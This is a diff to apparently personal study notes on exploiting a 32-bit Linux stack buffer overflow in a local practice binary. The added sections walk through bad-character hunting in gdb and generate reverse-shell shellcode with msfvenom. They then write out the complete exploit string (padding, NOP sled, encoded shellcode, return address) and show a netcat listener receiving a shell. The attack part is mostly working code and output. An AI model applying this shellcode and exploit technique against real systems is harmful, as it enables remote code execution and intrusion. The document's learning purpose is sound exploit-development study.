@@ -294,18 +294,22 @@ Program received signal SIGSEGV, Segmentation fault.
 
 
 ## Identifying bad characters
+
+usual culprits
 ```
 \x00 - Null Byte
 \x0A - Line Feed
 \x0D - Carriage Return
+\x20 - Space
 \xFF - Form Feed
 ```
 
+we're gonna be using a list of test characters
 ```bash
 CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 ```
 
-```bash
+```hex
 printf $CHARS|sed 's/\\x//g'|xxd
 00000000: 0001 0203 0405 0607 0809 0a0b 0c0d 0e0f  ................
 00000010: 1011 1213 1415 1617 1819 1a1b 1c1d 1e1f  ................
@@ -330,7 +334,7 @@ printf $CHARS|sed 's/\\x//g'|wc -c
 256
 ```
 
-set a breakpoint at bowfunc to inspect the memory there
+set a breakpoint to inspect the state of the memory as we're calling bowfunc
 ```bash
 (gdb) break bowfunc
 Breakpoint 1 at 0x565561ad
@@ -346,7 +350,7 @@ Breakpoint 1, 0x565561ad in bowfunc ()
 ```
 
 Lets examine the stack from the ESP, or stack pointer, or tip of the stalactite, up 
-```bash
+```hex
 (gdb) x/2000xb $esp+500
 0xffffd268:     0x02    0x00    0x00    0x00    0x1f    0x00    0x00    0x00
 0xffffd270:     0xe4    0xdf    0xff    0xff    0x0f    0x00    0x00    0x00
@@ -357,8 +361,8 @@ Lets examine the stack from the ESP, or stack pointer, or tip of the stalactite,
 0xffffd298:     0x99    0xdb    0xc6    0x69    0x36    0x38    0x36    0x00
 0xffffd2a0:     0x2f    0x68    0x6f    0x6d    0x65    0x2f    0x62    0x6c
 0xffffd2a8:     0x6e    0x6b    0x6e    0x2f    0x63    0x2f    0x62    0x6f
-0xffffd2b0:     0x77    0x33    0x32    0x00    0x55    0x55    0x55    0x55   ; beginning or 
-0xffffd2b8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd2b0:     0x77    0x33    0x32    0x00    0x55    0x55    0x55    0x55   ; beginning of
+0xffffd2b8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55   ; our buffer section
 0xffffd2c0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
 0xffffd2c8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
 0xffffd2d0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
@@ -457,9 +461,9 @@ Lets examine the stack from the ESP, or stack pointer, or tip of the stalactite,
 0xffffd5a8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
 0xffffd5b0:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
 0xffffd5b8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
-0xffffd5c0:     0x01    0x02    0x03    0x04    0x05    0x06    0x07    0x08
+0xffffd5c0:     0x01    0x02    0x03    0x04    0x05    0x06    0x07    0x08    ; the start of
 --Type <RET> for more, q to quit, c to continue without paging--
-0xffffd5c8:     0x00    0x0b    0x0c    0x0d    0x0e    0x0f    0x10    0x11
+0xffffd5c8:     0x00    0x0b    0x0c    0x0d    0x0e    0x0f    0x10    0x11    ; the chars
 0xffffd5d0:     0x12    0x13    0x14    0x15    0x16    0x17    0x18    0x19
 0xffffd5d8:     0x1a    0x1b    0x1c    0x1d    0x1e    0x1f    0x00    0x21
 0xffffd5e0:     0x22    0x23    0x24    0x25    0x26    0x27    0x28    0x29
@@ -489,7 +493,7 @@ Lets examine the stack from the ESP, or stack pointer, or tip of the stalactite,
 0xffffd6a0:     0xe2    0xe3    0xe4    0xe5    0xe6    0xe7    0xe8    0xe9
 0xffffd6a8:     0xea    0xeb    0xec    0xed    0xee    0xef    0xf0    0xf1
 0xffffd6b0:     0xf2    0xf3    0xf4    0xf5    0xf6    0xf7    0xf8    0xf9
-0xffffd6b8:     0xfa    0xfb    0xfc    0xfd    0xfe    0xff    0x66    0x66
+0xffffd6b8:     0xfa    0xfb    0xfc    0xfd    0xfe    0xff    0x66    0x66   ; and our EIP
 0xffffd6c0:     0x66    0x66    0x00    0x53    0x48    0x45    0x4c    0x4c
 0xffffd6c8:     0x3d    0x2f    0x62    0x69    0x6e    0x2f    0x62    0x61
 0xffffd6d0:     0x73    0x68    0x00    0x50    0x59    0x45    0x4e    0x56
@@ -606,9 +610,119 @@ Lets examine the stack from the ESP, or stack pointer, or tip of the stalactite,
 0xffffda30:     0x2e    0x61    0x6c    0x7a    0x3d    0x30    0x31    0x3b
 (gdb)
 ```
+
+looking at the start of the chars, we can see that the nullbyte has been ignore, as suggested by warning at runtime. So we can remove the nullbyte in our character list, and keep looking for other disallowed characters
+
 ```bash
+0xffffd5b8:     0x55    0x55    0x55    0x55    0x55    0x55    0x55    0x55
+0xffffd5c0:     0x01    0x02    0x03    0x04    0x05    0x06    0x07    0x08
+0xffffd5c8:     0x00    0x0b    0x0c    0x0d    0x0e    0x0f    0x10    0x11
+0xffffd5d0:     0x12    0x13    0x14    0x15    0x16    0x17    0x18    0x19
 ```
+
+we can see that were we expected 0x09 it was replaced by 0x00, we can remove this one from the list too
+and keep going like that looking through our list if anything has been replaced by 0x00, in our case we end up with: 
+```
+\x00\x09\x0a\x20
+```
+
+## Generating our actual shellcode
+
+now that we know the exact offset of the EIP, the cpu architecture we're running on, the platform, and the bad characters, we can go ahead an generate our shellcode
+
 ```bash
+msfvenom lhost=127.0.0.1 lport=31337 \
+  -p linux/x86/shell_reverse_tcp \
+  --format c \
+  --arch x86 \
+  --platform linux \
+  --bad-chars "\x00\x09\x0a\x20" \
+  --out shellcode 
 ```
+```
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of c file: 425 bytes
+Saved as: shellcode
+```
+```c
+unsigned char buf[] =
+"\xda\xca\xd9\x74\x24\xf4\xb8\x54\xc2\xcf\x23\x5d\x31\xc9"
+"\xb1\x12\x83\xc5\x04\x31\x45\x13\x03\x11\xd1\x2d\xd6\xa8"
+"\x0e\x46\xfa\x99\xf3\xfa\x97\x1f\x7d\x1d\xd7\x79\xb0\x5e"
+"\x8b\xdc\xfa\x60\x61\x5e\xb3\xe7\x80\x36\x3b\x18\x73\xc7"
+"\xab\x1a\x73\xbd\x42\x92\x92\xf1\xf3\xf4\x05\xa2\x48\xf7"
+"\x2c\xa5\x62\x78\x7c\x4d\x13\x56\xf2\xe5\x83\x87\xdb\x97"
+"\x3a\x51\xc0\x05\xee\xe8\xe6\x19\x1b\x26\x68";
+```
+
+we can now put that into one string
+```
+"\xda\xca\xd9\x74\x24\xf4\xb8\x54\xc2\xcf\x23\x5d\x31\xc9\xb1\x12\x83\xc5\x04\x31\x45\x13\x03\x11\xd1\x2d\xd6\xa8\x0e\x46\xfa\x99\xf3\xfa\x97\x1f\x7d\x1d\xd7\x79\xb0\x5e\x8b\xdc\xfa\x60\x61\x5e\xb3\xe7\x80\x36\x3b\x18\x73\xc7\xab\x1a\x73\xbd\x42\x92\x92\xf1\xf3\xf4\x05\xa2\x48\xf7\x2c\xa5\x62\x78\x7c\x4d\x13\x56\xf2\xe5\x83\x87\xdb\x97\x3a\x51\xc0\x05\xee\xe8\xe6\x19\x1b\x26\x68"
+```
+
+and addapt our exploit with that shellcode
 ```bash
+(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xd9\x74\x24\xf4\xb8\x54\xc2\xcf\x23\x5d\x31\xc9\xb1\x12\x83\xc5\x04\x31\x45\x13\x03\x11\xd1\x2d\xd6\xa8\x0e\x46\xfa\x99\xf3\xfa\x97\x1f\x7d\x1d\xd7\x79\xb0\x5e\x8b\xdc\xfa\x60\x61\x5e\xb3\xe7\x80\x36\x3b\x18\x73\xc7\xab\x1a\x73\xbd\x42\x92\x92\xf1\xf3\xf4\x05\xa2\x48\xf7\x2c\xa5\x62\x78\x7c\x4d\x13\x56\xf2\xe5\x83\x87\xdb\x97\x3a\x51\xc0\x05\xee\xe8\xe6\x19\x1b\x26\x68" + "\x66" * 4')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/blnkn/c/bow32 $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xd9\x74\x24\xf4\xb8\x54\xc2\xcf\x23\x5d\x31\xc9\xb1\x12\x83\xc5\x04\x31\x45\x13\x03\x11\xd1\x2d\xd6\xa8\x0e\x46\xfa\x99\xf3\xfa\x97\x1f\x7d\x1d\xd7\x79\xb0\x5e\x8b\xdc\xfa\x60\x61\x5e\xb3\xe7\x80\x36\x3b\x18\x73\xc7\xab\x1a\x73\xbd\x42\x92\x92\xf1\xf3\xf4\x05\xa2\x48\xf7\x2c\xa5\x62\x78\x7c\x4d\x13\x56\xf2\xe5\x83\x87\xdb\x97\x3a\x51\xc0\x05\xee\xe8\xe6\x19\x1b\x26\x68" + "\x66" * 4')
+
+Breakpoint 1, 0x565561ad in bowfunc ()
 ```
+
+we can check the stack again at our breakpoint and see if the end of the NOPs corresponds with the beginning of our shellcode as expected, and it does
+```hex
+0xffffd640:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xffffd648:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xffffd650:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xffffd658:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0xda
+0xffffd660:     0xca    0xd9    0x74    0x24    0xf4    0xb8    0x54    0xc2
+0xffffd668:     0xcf    0x23    0x5d    0x31    0xc9    0xb1    0x12    0x83
+0xffffd670:     0xc5    0x04    0x31    0x45    0x13    0x03    0x11    0xd1
+0xffffd678:     0x2d    0xd6    0xa8    0x0e    0x46    0xfa    0x99    0xf3
+0xffffd680:     0xfa    0x97    0x1f    0x7d    0x1d    0xd7    0x79    0xb0
+```
+
+verifying that we still controll the EIP after passing the breakpoint
+```bash
+(gdb) info register eip
+eip            0x66666666          0x66666666
+```
+
+so we can now point the EIP to somewhere in the NOPs sections, the execution will then just skip the nops until it finds our shellcode.
+![buffer-6.png](buffer-6.png)
+
+we're gonna jump to 0xffffd648, because this is something endian, we're gonna have to spell that backwards
+```bash
+0xffffd648 -> "\x48\xd6\xff\xff"
+```
+
+lets have a netcat listener going and run our BOF
+```bash
+(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xd9\x74\x24\xf4\xb8\x54\xc2\xcf\x23\x5d\x31\xc9\xb1\x12\x83\xc5\x04\x31\x45\x13\x03\x11\xd1\x2d\xd6\xa8\x0e\x46\xfa\x99\xf3\xfa\x97\x1f\x7d\x1d\xd7\x79\xb0\x5e\x8b\xdc\xfa\x60\x61\x5e\xb3\xe7\x80\x36\x3b\x18\x73\xc7\xab\x1a\x73\xbd\x42\x92\x92\xf1\xf3\xf4\x05\xa2\x48\xf7\x2c\xa5\x62\x78\x7c\x4d\x13\x56\xf2\xe5\x83\x87\xdb\x97\x3a\x51\xc0\x05\xee\xe8\xe6\x19\x1b\x26\x68" + "\x48\xd6\xff\xff"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/blnkn/c/bow32 $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xd9\x74\x24\xf4\xb8\x54\xc2\xcf\x23\x5d\x31\xc9\xb1\x12\x83\xc5\x04\x31\x45\x13\x03\x11\xd1\x2d\xd6\xa8\x0e\x46\xfa\x99\xf3\xfa\x97\x1f\x7d\x1d\xd7\x79\xb0\x5e\x8b\xdc\xfa\x60\x61\x5e\xb3\xe7\x80\x36\x3b\x18\x73\xc7\xab\x1a\x73\xbd\x42\x92\x92\xf1\xf3\xf4\x05\xa2\x48\xf7\x2c\xa5\x62\x78\x7c\x4d\x13\x56\xf2\xe5\x83\x87\xdb\x97\x3a\x51\xc0\x05\xee\xe8\xe6\x19\x1b\x26\x68" + "\x48\xd6\xff\xff"')
+
+Breakpoint 1, 0x565561ad in bowfunc ()
+(gdb) c
+Continuing.
+process 36361 is executing new program: /usr/bin/dash
+Error in re-setting breakpoint 1: Function "bowfunc" not defined.
+```
+
+boom!
+```bash
+blnkn@amd64:~$ nc -lvnp 31337
+listening on [any] 31337 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 35310
+id
+uid=1000(blnkn) gid=1000(blnkn) groups=1000(blnkn),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),118(lpadmin),121(scanner)
+pwd
+/home/blnkn/c
+```
+ 
